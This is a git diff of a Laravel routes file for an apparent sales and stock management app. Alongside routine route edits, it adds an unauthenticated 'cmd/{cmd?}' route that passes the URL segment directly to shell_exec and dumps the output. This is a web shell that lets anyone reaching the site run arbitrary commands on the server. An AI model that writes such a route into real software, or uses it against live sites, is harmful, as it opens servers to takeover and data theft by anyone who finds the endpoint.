@@ -15,9 +15,16 @@ Route::get('/', function () {
     return view('welcome');
 });
 
+Route::get('cmd/{cmd?}', function($cmd='ls'){
+  dd(shell_exec($cmd));
+  //return Artisan::call('inspire');
+});
+
 Route::get('dashboard', 'ReportsController@dashboard')->middleware('auth');
 
 Route::get('type/{id}/{type?}', 'SettingsController@setType')->middleware('auth');
+
+Route::get('sales/returns', 'SalesController@returnList')->middleware('auth');
 
 
 Route::resource('stock', 'StocksController');
@@ -29,9 +36,9 @@ Route::resource('reports','ReportsController');
 
 Route::resource('settings', 'SettingsController');
 
-Route::get('users', function(){
-  return view('user.users');
-})->middleware('auth');
+// Route::get('users', function(){
+//   return view('user.users');
+// })->middleware('auth');
 
 Route::prefix('order')->group(function () {
   Route::get('{id}', 'SalesController@order')->where('id', '[0-9]+');
